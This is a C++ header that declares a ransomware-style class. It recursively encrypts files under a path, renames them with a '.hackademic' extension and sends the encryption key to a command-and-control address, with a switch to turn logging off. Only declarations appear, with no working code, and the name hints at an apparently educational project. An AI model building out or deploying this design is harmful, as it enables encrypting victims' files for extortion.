#ifndef CRYPTOR_H_
#define CRYPTOR_H_

#include <cpr/cpr.h>
#include <filesystem>
#include <iostream>
#include <openssl/evp.h>
#include <string>

class AES256CBC {
public:
    bool isLogging = true;
    // isLogging getter setter
    cpr::Url C2Addr;

    std::string base64EncodeKey();
    void base64DecodeKey(const std::string& encodedKey);
    bool decryptFile(std::filesystem::path path);
    void decryptRecursively(const std::filesystem::path& path);
    bool encryptFile(const std::filesystem::path& pathIn);
    void encryptRecursively(const std::filesystem::path& path);
    void generateKey();
    void keyFromC2(const std::string& id);
    void keyFromFile();
    void keyToC2(const std::string& id);
    void keyToFile();

    AES256CBC();
    ~AES256CBC();

private:
    const int keySize_ = 32;
    const int blockSize_ = 16;
    const std::string extension_ = ".hackademic";
    unsigned char* key;
    EVP_CIPHER* evp_aes256cbc;

    std::ostream& cout() { return isLogging ? std::cout : nullStream; };
    std::ostream& cerr() { return isLogging ? std::cerr : nullStream; };
    std::ostream nullStream{nullptr};
}; // class AES256CBC

#endif

